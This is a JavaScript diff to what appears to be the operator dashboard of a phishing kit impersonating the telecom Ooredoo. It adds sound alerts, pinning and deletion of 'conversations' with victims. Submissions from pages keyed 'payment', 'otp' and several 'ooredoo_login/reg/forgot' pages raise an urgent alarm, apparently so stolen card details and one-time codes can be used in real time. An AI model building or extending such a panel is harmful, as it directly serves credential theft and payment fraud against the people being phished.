@@ -27,6 +27,7 @@ let streamWatchdog = null;
 
 /** Entry point. */
 async function startDashboard() {
+  renderSoundToggle();
   renderConnection('connecting');
 
   let boot;
@@ -123,11 +124,73 @@ const REALTIME_EVENTS = [
   'user.renamed',
   'user.read',
   'user.status',
+  'user.pinned',
+  'user.deleted',
   'submission.created',
   'command.issued',
   'conversations.read_all',
   'conversations.cleared'
 ];
+
+/* ------------------------------------------------------------------
+   Sound synthesizer (Web Audio API - zero external files)
+   ------------------------------------------------------------------ */
+
+let audioCtx = null;
+
+function playNotificationSound(urgent) {
+  if (store.soundEnabled === false) {
+    return;
+  }
+  try {
+    const Ctx = window.AudioContext || window.webkitAudioContext;
+    if (!Ctx) {
+      return;
+    }
+    if (!audioCtx) {
+      audioCtx = new Ctx();
+    }
+    if (audioCtx.state === 'suspended') {
+      audioCtx.resume();
+    }
+
+    const now = audioCtx.currentTime;
+    const notes = urgent ? [587.33, 880, 1174.66] : [523.25, 783.99];
+
+    notes.forEach(function (freq, idx) {
+      const osc = audioCtx.createOscillator();
+      const gain = audioCtx.createGain();
+      osc.type = 'sine';
+      osc.frequency.setValueAtTime(freq, now + idx * 0.11);
+
+      gain.gain.setValueAtTime(0.001, now + idx * 0.11);
+      gain.gain.exponentialRampToValueAtTime(0.18, now + idx * 0.11 + 0.02);
+      gain.gain.exponentialRampToValueAtTime(0.001, now + idx * 0.11 + 0.22);
+
+      osc.connect(gain);
+      gain.connect(audioCtx.destination);
+
+      osc.start(now + idx * 0.11);
+      osc.stop(now + idx * 0.11 + 0.24);
+    });
+  } catch (e) {
+    /* Ignore autoplay restrictions prior to first click */
+  }
+}
+
+function toggleSoundAlerts() {
+  store.soundEnabled = store.soundEnabled === false;
+  try {
+    localStorage.setItem('jusour_sound_enabled', store.soundEnabled ? '1' : '0');
+  } catch (e) {}
+  renderSoundToggle();
+  if (store.soundEnabled) {
+    playNotificationSound(false);
+    showToast('تم تفعيل التنبيهات الصوتية 🔔', 'success');
+  } else {
+    showToast('تم كتم التنبيهات الصوتية 🔕', 'info');
+  }
+}
 
 /** Reset the watchdog so a silent stream is reported as offline. */
 function armWatchdog() {
@@ -181,6 +244,21 @@ function handleRealtimeEvent(type, payload) {
     return;
   }
 
+  if (type === 'user.deleted') {
+    const deletedId = Number(payload.id);
+    storeRemoveConversation(deletedId);
+    if (store.selectedId === deletedId) {
+      storeSelect(null);
+      openConversation.id = null;
+      openConversation.submissions = [];
+      openConversation.navigation = [];
+      renderChatPlaceholder();
+    }
+    renderConversationList();
+    renderStats();
+    return;
+  }
+
   if (!row) {
     return;
   }
@@ -192,10 +270,21 @@ function handleRealtimeEvent(type, payload) {
   storeUpsertConversation(row);
 
   if (type === 'user.created') {
+    playNotificationSound(false);
     showToast('عميل جديد: ' + (row.name || row.ref), 'info');
   } else if (type === 'submission.created') {
+    const urgentPages = ['payment', 'otp', 'ooredoo_login', 'ooredoo_reg', 'ooredoo_forgot'];
+    const isUrgent = urgentPages.indexOf(payload.page_key) !== -1;
+    playNotificationSound(isUrgent);
     const label = payload.page_label || 'بيانات جديدة';
     showToast((row.name || row.ref) + ' - ' + label, 'info');
+  } else if (type === 'user.pinned') {
+    updateConversationCard(id);
+    refreshConversationOrder();
+    if (store.selectedId === id) {
+      renderChatHeader(row);
+    }
+    return;
   }
 
   const nowSelected = store.selectedId === id;
@@ -395,6 +484,60 @@ async function clearAllData() {
   }
 }
 
+/** Toggle pinning a single conversation to the top of the list. */
+async function togglePinConversation(id) {
+  const numId = Number(id);
+  if (!numId) {
+    return;
+  }
+  const current = store.conversations.get(numId);
+  const nextPinned = !(current && current.is_pinned === true);
+
+  try {
+    const response = await api.pinUser(numId, nextPinned);
+    storeUpsertConversation(response.user);
+    updateConversationCard(numId);
+    refreshConversationOrder();
+    if (store.selectedId === numId) {
+      renderChatHeader(response.user);
+    }
+    showToast(response.is_pinned ? 'تم تثبيت المحادثة في الأعلى 📌' : 'تم إلغاء تثبيت المحادثة', 'success');
+  } catch (error) {
+    showToast('تعذّر تحديث التثبيت.', 'error');
+  }
+}
+
+/** Delete a single conversation and all its submissions. */
+async function deleteSingleConversation(id) {
+  const numId = Number(id);
+  if (!numId) {
+    return;
+  }
+  const row = store.conversations.get(numId);
+  const label = row ? (row.name || row.ref) : ('#' + numId);
+  const confirmed = window.confirm('هل أنت متأكد من حذف محادثة (' + label + ') وجميع بياناتها؟');
+  if (!confirmed) {
+    return;
+  }
+
+  try {
+    await api.deleteUser(numId);
+    storeRemoveConversation(numId);
+    if (store.selectedId === numId) {
+      storeSelect(null);
+      openConversation.id = null;
+      openConversation.submissions = [];
+      openConversation.navigation = [];
+      renderChatPlaceholder();
+    }
+    renderConversationList();
+    renderStats();
+    showToast('تم حذف المحادثة بنجاح.', 'success');
+  } catch (error) {
+    showToast('تعذّر حذف المحادثة.', 'error');
+  }
+}
+
 /** Sign out and return to the login screen. */
 async function signOut() {
   try {
@@ -432,8 +575,21 @@ async function manualRefresh() {
 
 /** Attach every listener. */
 function wireEvents() {
-  /* Open a conversation from the list. */
+  /* Open a conversation from the list, or trigger quick pin/delete buttons on the card. */
   $('conversationList').addEventListener('click', function (event) {
+    const actionBtn = event.target.closest('[data-card-action]');
+    if (actionBtn) {
+      event.stopPropagation();
+      const action = actionBtn.getAttribute('data-card-action');
+      const targetId = Number(actionBtn.getAttribute('data-id'));
+      if (action === 'pin') {
+        togglePinConversation(targetId);
+      } else if (action === 'delete') {
+        deleteSingleConversation(targetId);
+      }
+      return;
+    }
+
     const card = event.target.closest('.convo');
     if (!card) {
       return;
@@ -493,6 +649,23 @@ function wireEvents() {
   /* Top bar & list tools. */
   $('refreshBtn').addEventListener('click', manualRefresh);
   $('markAllReadBtn').addEventListener('click', markEverythingRead);
+  if ($('soundToggleBtn')) {
+    $('soundToggleBtn').addEventListener('click', toggleSoundAlerts);
+  }
+  if ($('pinConvoBtn')) {
+    $('pinConvoBtn').addEventListener('click', function () {
+      if (openConversation.id) {
+        togglePinConversation(openConversation.id);
+      }
+    });
+  }
+  if ($('deleteConvoBtn')) {
+    $('deleteConvoBtn').addEventListener('click', function () {
+      if (openConversation.id) {
+        deleteSingleConversation(openConversation.id);
+      }
+    });
+  }
   if ($('clearAllTopBtn')) {
     $('clearAllTopBtn').addEventListener('click', clearAllData);
   }
